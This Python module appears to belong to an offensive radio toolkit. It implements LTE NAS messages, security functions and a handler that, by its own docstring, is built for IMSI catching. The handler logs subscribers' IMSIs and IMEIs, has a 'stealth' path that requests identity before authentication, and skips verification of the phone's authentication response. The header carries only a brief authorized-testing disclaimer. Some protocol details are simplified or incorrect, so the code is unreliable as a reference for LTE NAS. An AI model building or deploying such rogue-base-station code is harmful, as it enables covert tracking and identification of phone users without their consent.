#!/usr/bin/env python3
"""
RF Arsenal OS - NAS (Non-Access Stratum) Protocol

Production-grade NAS implementation for LTE/5G.
Handles authentication, security, and session management.

IMPORTANT: For authorized security testing only.
"""

import numpy as np
from typing import Optional, Tuple, List, Dict, Any
from dataclasses import dataclass, field
from enum import Enum
import logging
import time
import threading
import hashlib
import hmac
import struct
from Crypto.Cipher import AES
from Crypto.Util import Counter

logger = logging.getLogger(__name__)


class NASMessageType(Enum):
    """EPS Mobility Management (EMM) message types"""
    # Mobility Management
    ATTACH_REQUEST = 0x41
    ATTACH_ACCEPT = 0x42
    ATTACH_COMPLETE = 0x43
    ATTACH_REJECT = 0x44
    DETACH_REQUEST = 0x45
    DETACH_ACCEPT = 0x46
    
    # Authentication
    AUTHENTICATION_REQUEST = 0x52
    AUTHENTICATION_RESPONSE = 0x53
    AUTHENTICATION_REJECT = 0x54
    AUTHENTICATION_FAILURE = 0x5C
    
    # Security
    SECURITY_MODE_COMMAND = 0x5D
    SECURITY_MODE_COMPLETE = 0x5E
    SECURITY_MODE_REJECT = 0x5F
    
    # Identity
    IDENTITY_REQUEST = 0x55
    IDENTITY_RESPONSE = 0x56
    
    # Tracking Area Update
    TRACKING_AREA_UPDATE_REQUEST = 0x48
    TRACKING_AREA_UPDATE_ACCEPT = 0x49
    TRACKING_AREA_UPDATE_COMPLETE = 0x4A
    TRACKING_AREA_UPDATE_REJECT = 0x4B
    
    # Service Request
    SERVICE_REQUEST = 0x4C
    SERVICE_REJECT = 0x4E
    
    # Information
    EMM_STATUS = 0x60
    EMM_INFORMATION = 0x61
    
    # Downlink/Uplink NAS Transport
    DOWNLINK_NAS_TRANSPORT = 0x62
    UPLINK_NAS_TRANSPORT = 0x63


class IdentityType(Enum):
    """Identity types"""
    IMSI = 1
    IMEI = 2
    IMEISV = 3
    TMSI = 4
    NO_IDENTITY = 0


class SecurityHeaderType(Enum):
    """Security header types"""
    PLAIN_NAS = 0
    INTEGRITY_PROTECTED = 1
    INTEGRITY_PROTECTED_CIPHERED = 2
    INTEGRITY_PROTECTED_NEW_CONTEXT = 3
    INTEGRITY_PROTECTED_CIPHERED_NEW_CONTEXT = 4


@dataclass
class NASSecurityContext:
    """NAS security context"""
    knas_int: bytes = b''  # Integrity key
    knas_enc: bytes = b''  # Encryption key
    nas_count_ul: int = 0  # Uplink count
    nas_count_dl: int = 0  # Downlink count
    int_algorithm: int = 0  # EIA0-EIA3
    enc_algorithm: int = 0  # EEA0-EEA3
    bearer: int = 0


@dataclass
class IMSI:
    """International Mobile Subscriber Identity"""
    mcc: str = "001"
    mnc: str = "01"
    msin: str = "0000000000"
    
    def __str__(self) -> str:
        return f"{self.mcc}{self.mnc}{self.msin}"
    
    def encode(self) -> bytes:
        """Encode IMSI as BCD"""
        imsi_str = str(self)
        
        # Pad to even length
        if len(imsi_str) % 2:
            imsi_str = imsi_str + 'F'
        
        result = bytearray()
        
        # First byte: identity type (001) | odd/even indicator | digit 1
        first_digit = int(imsi_str[0])
        odd_indicator = 1 if len(str(self)) % 2 else 0
        result.append((first_digit << 4) | (odd_indicator << 3) | IdentityType.IMSI.value)
        
        # Remaining digits in pairs (swapped nibbles)
        for i in range(1, len(imsi_str), 2):
            d1 = int(imsi_str[i]) if imsi_str[i] != 'F' else 0xF
            d2 = int(imsi_str[i + 1]) if i + 1 < len(imsi_str) and imsi_str[i + 1] != 'F' else 0xF
            result.append((d2 << 4) | d1)
        
        return bytes(result)
    
    @classmethod
    def decode(cls, data: bytes) -> 'IMSI':
        """Decode BCD-encoded IMSI"""
        digits = []
        
        # First byte
        digits.append(str((data[0] >> 4) & 0xF))
        
        # Remaining bytes
        for byte in data[1:]:
            d1 = byte & 0xF
            d2 = (byte >> 4) & 0xF
            if d1 != 0xF:
                digits.append(str(d1))
            if d2 != 0xF:
                digits.append(str(d2))
        
        imsi_str = ''.join(digits)
        
        return cls(
            mcc=imsi_str[:3],
            mnc=imsi_str[3:5] if len(imsi_str) >= 5 else imsi_str[3:],
            msin=imsi_str[5:] if len(imsi_str) > 5 else ""
        )


@dataclass
class NASMessage:
    """Generic NAS message container"""
    message_type: NASMessageType
    security_header: SecurityHeaderType = SecurityHeaderType.PLAIN_NAS
    protocol_discriminator: int = 0x07  # EPS Mobility Management
    payload: bytes = b''
    mac: bytes = b'\x00\x00\x00\x00'  # Message Authentication Code
    sequence_number: int = 0


class AttachRequest:
    """Attach Request message"""
    
    def __init__(self, imsi: Optional[IMSI] = None,
                 attach_type: int = 1,  # EPS attach
                 ue_network_capability: bytes = b'\xe0\xe0'):
        self.imsi = imsi or IMSI()
        self.attach_type = attach_type
        self.ue_network_capability = ue_network_capability
    
    def encode(self) -> bytes:
        """Encode Attach Request"""
        result = bytearray()
        
        # Protocol discriminator + Security header
        result.append(0x07)  # EMM + plain NAS
        
        # Message type
        result.append(NASMessageType.ATTACH_REQUEST.value)
        
        # EPS attach type + NAS key set identifier
        result.append((0x0 << 4) | self.attach_type)  # KSI = 0, attach type
        
        # EPS mobile identity (IMSI)
        imsi_encoded = self.imsi.encode()
        result.append(len(imsi_encoded))
        result.extend(imsi_encoded)
        
        # UE network capability
        result.append(len(self.ue_network_capability))
        result.extend(self.ue_network_capability)
        
        # ESM message container (dummy PDN connectivity request)
        esm_msg = bytes([0x02, 0x01, 0xD0, 0x11, 0x27, 0x08])  # Simplified
        result.append(len(esm_msg) >> 8)
        result.append(len(esm_msg) & 0xFF)
        result.extend(esm_msg)
        
        return bytes(result)
    
    @classmethod
    def decode(cls, data: bytes) -> 'AttachRequest':
        """Decode Attach Request"""
        offset = 2  # Skip protocol discriminator and message type
        
        attach_type = data[offset] & 0x0F
        offset += 1
        
        # EPS mobile identity
        identity_len = data[offset]
        offset += 1
        imsi = IMSI.decode(data[offset:offset + identity_len])
        offset += identity_len
        
        # UE network capability
        capability_len = data[offset]
        offset += 1
        ue_capability = data[offset:offset + capability_len]
        
        return cls(
            imsi=imsi,
            attach_type=attach_type,
            ue_network_capability=ue_capability
        )


class AttachAccept:
    """Attach Accept message"""
    
    def __init__(self, guti: Optional[bytes] = None,
                 tai_list: Optional[bytes] = None,
                 eps_bearer_context: Optional[bytes] = None):
        self.guti = guti or b'\xf0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
        self.tai_list = tai_list or b'\x00\x00\x00\x01\x00\x01'
        self.eps_bearer_context = eps_bearer_context
    
    def encode(self) -> bytes:
        """Encode Attach Accept"""
        result = bytearray()
        
        # Protocol discriminator + Security header (would be protected)
        result.append(0x07)
        
        # Message type
        result.append(NASMessageType.ATTACH_ACCEPT.value)
        
        # EPS attach result + spare
        result.append(0x01)  # EPS only
        
        # T3412 value (GPRS timer)
        result.append(0x01)  # Value = 1 unit
        
        # TAI list
        result.append(0x06)  # Length
        result.extend(self.tai_list)
        
        # ESM message container
        esm_msg = self._generate_esm_activate_default_bearer()
        result.append(len(esm_msg) >> 8)
        result.append(len(esm_msg) & 0xFF)
        result.extend(esm_msg)
        
        # Optional: GUTI
        result.append(0x50)  # GUTI IEI
        result.append(len(self.guti))
        result.extend(self.guti)
        
        return bytes(result)
    
    def _generate_esm_activate_default_bearer(self) -> bytes:
        """Generate ESM Activate Default EPS Bearer Context Request"""
        result = bytearray()
        
        # Protocol discriminator
        result.append(0x02)  # ESM
        
        # EPS bearer identity + PTI
        result.append(0x05)  # Bearer ID 5
        result.append(0x00)  # PTI = 0
        
        # Message type
        result.append(0xC1)  # Activate default EPS bearer context request
        
        # EPS QoS
        result.append(0x09)  # Length
        result.extend(b'\x09\x00\x00\x00\x00\x00\x00\x00\x00')
        
        # Access point name
        apn = b'\x08internet'
        result.append(len(apn))
        result.extend(apn)
        
        # PDN address
        result.append(0x05)  # Length
        result.append(0x01)  # IPv4
        result.extend(b'\x0a\x00\x00\x01')  # 10.0.0.1
        
        return bytes(result)


class AuthenticationRequest:
    """Authentication Request message"""
    
    def __init__(self, rand: bytes, autn: bytes, 
                 ksi: int = 0):
        """
        Args:
            rand: Random challenge (16 bytes)
            autn: Authentication token (16 bytes)
            ksi: Key Set Identifier
        """
        self.rand = rand
        self.autn = autn
        self.ksi = ksi
    
    def encode(self) -> bytes:
        """Encode Authentication Request"""
        result = bytearray()
        
        # Protocol discriminator
        result.append(0x07)  # EMM
        
        # Message type
        result.append(NASMessageType.AUTHENTICATION_REQUEST.value)
        
        # NAS key set identifier
        result.append(self.ksi & 0x07)
        
        # Spare half octet
        result.append(0x00)
        
        # RAND
        result.extend(self.rand)
        
        # AUTN
        result.append(0x10)  # AUTN IEI
        result.append(len(self.autn))
        result.extend(self.autn)
        
        return bytes(result)


class SecurityModeCommand:
    """Security Mode Command message"""
    
    def __init__(self, int_algorithm: int = 2,  # EIA2 (AES-CMAC)
                 enc_algorithm: int = 2,  # EEA2 (AES-CTR)
                 ue_security_capability: bytes = b'\xe0\xe0',
                 ksi: int = 0):
        self.int_algorithm = int_algorithm
        self.enc_algorithm = enc_algorithm
        self.ue_security_capability = ue_security_capability
        self.ksi = ksi
    
    def encode(self) -> bytes:
        """Encode Security Mode Command"""
        result = bytearray()
        
        # Protocol discriminator (integrity protected)
        result.append(0x37)  # EMM + integrity protected new context
        
        # Message type
        result.append(NASMessageType.SECURITY_MODE_COMMAND.value)
        
        # Selected NAS security algorithms
        result.append((self.enc_algorithm << 4) | self.int_algorithm)
        
        # NAS key set identifier
        result.append(self.ksi & 0x07)
        
        # Replayed UE security capability
        result.append(len(self.ue_security_capability))
        result.extend(self.ue_security_capability)
        
        return bytes(result)


class IdentityRequest:
    """Identity Request message"""
    
    def __init__(self, identity_type: IdentityType = IdentityType.IMSI):
        self.identity_type = identity_type
    
    def encode(self) -> bytes:
        """Encode Identity Request"""
        result = bytearray()
        
        # Protocol discriminator
        result.append(0x07)  # EMM
        
        # Message type
        result.append(NASMessageType.IDENTITY_REQUEST.value)
        
        # Identity type
        result.append(self.identity_type.value)
        
        return bytes(result)


class NASSecurityEngine:
    """
    NAS Security Functions
    
    Implements EIA/EEA algorithms for integrity and encryption.
    """
    
    @staticmethod
    def derive_knas_keys(kasme: bytes, algorithm_type: int,
                        algorithm_id: int) -> Tuple[bytes, bytes]:
        """
        Derive KNASint and KNASenc from KASME
        
        Args:
            kasme: Key ASME (32 bytes)
            algorithm_type: 1 for integrity, 2 for encryption
            algorithm_id: Algorithm identifier (1=SNOW, 2=AES, 3=ZUC)
        
        Returns:
            (knas_int, knas_enc)
        """
        # KDF as per 3GPP TS 33.401
        
        # For integrity
        s_int = struct.pack('>B', 0x15)  # FC
        s_int += struct.pack('>B', algorithm_type) + struct.pack('>H', 1)
        s_int += struct.pack('>B', algorithm_id) + struct.pack('>H', 1)
        knas_int = hmac.new(kasme, s_int, hashlib.sha256).digest()[:16]
        
        # For encryption  
        s_enc = struct.pack('>B', 0x15)  # FC
        s_enc += struct.pack('>B', 2) + struct.pack('>H', 1)
        s_enc += struct.pack('>B', algorithm_id) + struct.pack('>H', 1)
        knas_enc = hmac.new(kasme, s_enc, hashlib.sha256).digest()[:16]
        
        return knas_int, knas_enc
    
    @staticmethod
    def eia2_mac(key: bytes, count: int, bearer: int, 
                 direction: int, message: bytes) -> bytes:
        """
        EIA2 (AES-CMAC based) integrity algorithm
        
        Args:
            key: 128-bit key
            count: 32-bit counter
            bearer: 5-bit bearer ID
            direction: 1 bit (0=UL, 1=DL)
            message: Message to protect
        
        Returns:
            32-bit MAC
        """
        # Build input
        iv = struct.pack('>I', count)
        iv += struct.pack('>B', (bearer << 3) | (direction << 2))
        iv += b'\x00' * 3  # Padding
        
        # CMAC
        from Crypto.Hash import CMAC
        from Crypto.Cipher import AES
        
        cobj = CMAC.new(key, ciphermod=AES)
        cobj.update(iv + message)
        
        return cobj.digest()[:4]
    
    @staticmethod
    def eea2_encrypt(key: bytes, count: int, bearer: int,
                    direction: int, plaintext: bytes) -> bytes:
        """
        EEA2 (AES-CTR based) encryption algorithm
        
        Args:
            key: 128-bit key
            count: 32-bit counter
            bearer: 5-bit bearer ID  
            direction: 1 bit
            plaintext: Data to encrypt
        
        Returns:
            Ciphertext
        """
        # Build IV/counter
        iv = struct.pack('>I', count)
        iv += struct.pack('>B', (bearer << 3) | (direction << 2))
        iv += b'\x00' * 3
        iv += b'\x00' * 8  # Pad to 16 bytes
        
        # AES-CTR
        ctr = Counter.new(128, initial_value=int.from_bytes(iv, 'big'))
        cipher = AES.new(key, AES.MODE_CTR, counter=ctr)
        
        return cipher.encrypt(plaintext)
    
    @staticmethod
    def eea2_decrypt(key: bytes, count: int, bearer: int,
                    direction: int, ciphertext: bytes) -> bytes:
        """EEA2 decryption (same as encryption for CTR mode)"""
        return NASSecurityEngine.eea2_encrypt(key, count, bearer, 
                                              direction, ciphertext)


class NASHandler:
    """
    NAS Protocol Handler
    
    Manages NAS message processing, authentication, and security.
    Designed for IMSI catching and security testing.
    """
    
    def __init__(self, stealth_mode: bool = True,
                 capture_imsi: bool = True):
        self.stealth_mode = stealth_mode
        self.capture_imsi = capture_imsi
        self.logger = logging.getLogger('NASHandler')
        
        self._lock = threading.Lock()
        
        # UE contexts
        self.ue_contexts: Dict[bytes, Dict] = {}  # Key: IMSI bytes
        
        # Captured identities (for security testing)
        self.captured_identities: List[Dict] = []
        
        # Security engine
        self.security = NASSecurityEngine()
        
        # Message handlers
        self._handlers = {
            NASMessageType.ATTACH_REQUEST: self._handle_attach_request,
            NASMessageType.AUTHENTICATION_RESPONSE: self._handle_auth_response,
            NASMessageType.SECURITY_MODE_COMPLETE: self._handle_smc_complete,
            NASMessageType.IDENTITY_RESPONSE: self._handle_identity_response,
            NASMessageType.DETACH_REQUEST: self._handle_detach_request,
        }
    
    def process_message(self, data: bytes, rnti: int = 0) -> Optional[bytes]:
        """
        Process incoming NAS message.
        
        Returns response message if any.
        """
        try:
            if len(data) < 2:
                return None
            
            # Parse header
            security_header = (data[0] >> 4) & 0x0F
            protocol_disc = data[0] & 0x0F
            
            if protocol_disc != 0x07:  # Not EMM
                return None
            
            # Decrypt if needed
            if security_header in [2, 4]:  # Ciphered
                # Would decrypt here with security context
                pass
            
            # Verify integrity if needed
            if security_header in [1, 2, 3, 4]:
                # Would verify MAC here
                pass
            
            # Get message type
            msg_type_byte = data[1]
            try:
                msg_type = NASMessageType(msg_type_byte)
            except ValueError:
                self.logger.warning(f"Unknown NAS message type: 0x{msg_type_byte:02x}")
                return None
            
            # Call handler
            if msg_type in self._handlers:
                return self._handlers[msg_type](data, rnti)
            
        except Exception as e:
            self.logger.error(f"Error processing NAS message: {e}")
        
        return None
    
    def _handle_attach_request(self, data: bytes, rnti: int) -> Optional[bytes]:
        """Handle Attach Request - IMSI capture point"""
        self.logger.info("Received Attach Request")
        
        try:
            attach_req = AttachRequest.decode(data)
            
            # Capture IMSI
            if self.capture_imsi:
                with self._lock:
                    capture_record = {
                        'imsi': str(attach_req.imsi),
                        'mcc': attach_req.imsi.mcc,
                        'mnc': attach_req.imsi.mnc,
                        'rnti': rnti,
                        'timestamp': time.time(),
                        'ue_capability': attach_req.ue_network_capability.hex(),
                    }
                    self.captured_identities.append(capture_record)
                    
                    self.logger.info(f"[CAPTURE] IMSI: {capture_record['imsi']}")
            
            # Store context
            imsi_bytes = attach_req.imsi.encode()
            with self._lock:
                self.ue_contexts[imsi_bytes] = {
                    'imsi': attach_req.imsi,
                    'state': 'attach_pending',
                    'rnti': rnti,
                    'created': time.time(),
                }
            
            # Option 1: Request identity (get IMEI too)
            if self.stealth_mode:
                # In stealth mode, might skip auth
                return self._generate_identity_request(IdentityType.IMEI)
            
            # Option 2: Start authentication
            return self._generate_auth_request()
            
        except Exception as e:
            self.logger.error(f"Error handling Attach Request: {e}")
        
        return None
    
    def _handle_auth_response(self, data: bytes, rnti: int) -> Optional[bytes]:
        """Handle Authentication Response"""
        self.logger.info("Received Authentication Response")
        
        # Extract RES from response
        if len(data) > 3:
            res = data[3:3 + data[2]]
            self.logger.info(f"RES: {res.hex()}")
            
            # In real implementation, would verify RES against XRES
            
            # Send Security Mode Command
            return self._generate_security_mode_command()
        
        return None
    
    def _handle_smc_complete(self, data: bytes, rnti: int) -> Optional[bytes]:
        """Handle Security Mode Complete"""
        self.logger.info("Received Security Mode Complete")
        
        # Security is now active
        # Send Attach Accept
        return self._generate_attach_accept()
    
    def _handle_identity_response(self, data: bytes, rnti: int) -> Optional[bytes]:
        """Handle Identity Response - Capture point for IMEI"""
        self.logger.info("Received Identity Response")
        
        try:
            # Extract identity
            if len(data) > 3:
                identity_len = data[2]
                identity_data = data[3:3 + identity_len]
                
                identity_type = identity_data[0] & 0x07
                
                if identity_type == IdentityType.IMEI.value:
                    # Decode IMEI
                    imei_digits = []
                    imei_digits.append(str((identity_data[0] >> 4) & 0x0F))
                    
                    for byte in identity_data[1:]:
                        d1 = byte & 0x0F
                        d2 = (byte >> 4) & 0x0F
                        if d1 != 0xF:
                            imei_digits.append(str(d1))
                        if d2 != 0xF:
                            imei_digits.append(str(d2))
                    
                    imei = ''.join(imei_digits)
                    
                    with self._lock:
                        # Update most recent capture with IMEI
                        if self.captured_identities:
                            self.captured_identities[-1]['imei'] = imei
                    
                    self.logger.info(f"[CAPTURE] IMEI: {imei}")
            
            # Continue with authentication
            return self._generate_auth_request()
            
        except Exception as e:
            self.logger.error(f"Error handling Identity Response: {e}")
        
        return None
    
    def _handle_detach_request(self, data: bytes, rnti: int) -> Optional[bytes]:
        """Handle Detach Request"""
        self.logger.info("Received Detach Request")
        
        # Generate Detach Accept
        result = bytearray([0x07])  # EMM
        result.append(NASMessageType.DETACH_ACCEPT.value)
        
        return bytes(result)
    
    def _generate_identity_request(self, identity_type: IdentityType) -> bytes:
        """Generate Identity Request"""
        req = IdentityRequest(identity_type)
        return req.encode()
    
    def _generate_auth_request(self) -> bytes:
        """Generate Authentication Request with random challenge"""
        # Generate random RAND and AUTN (for testing)
        rand = np.random.bytes(16)
        autn = np.random.bytes(16)
        
        req = AuthenticationRequest(rand, autn)
        return req.encode()
    
    def _generate_security_mode_command(self) -> bytes:
        """Generate Security Mode Command"""
        smc = SecurityModeCommand(
            int_algorithm=2,  # EIA2
            enc_algorithm=2,  # EEA2
            ue_security_capability=b'\xe0\xe0'
        )
        return smc.encode()
    
    def _generate_attach_accept(self) -> bytes:
        """Generate Attach Accept"""
        accept = AttachAccept()
        return accept.encode()
    
    def get_captured_identities(self) -> List[Dict]:
        """Get list of captured identities"""
        with self._lock:
            return self.captured_identities.copy()
    
    def clear_captures(self):
        """Clear captured identities"""
        with self._lock:
            self.captured_identities.clear()
    
    def get_statistics(self) -> Dict:
        """Get NAS statistics"""
        with self._lock:
            return {
                'total_captures': len(self.captured_identities),
                'active_contexts': len(self.ue_contexts),
                'unique_imsis': len(set(c['imsi'] for c in self.captured_identities)),
            }
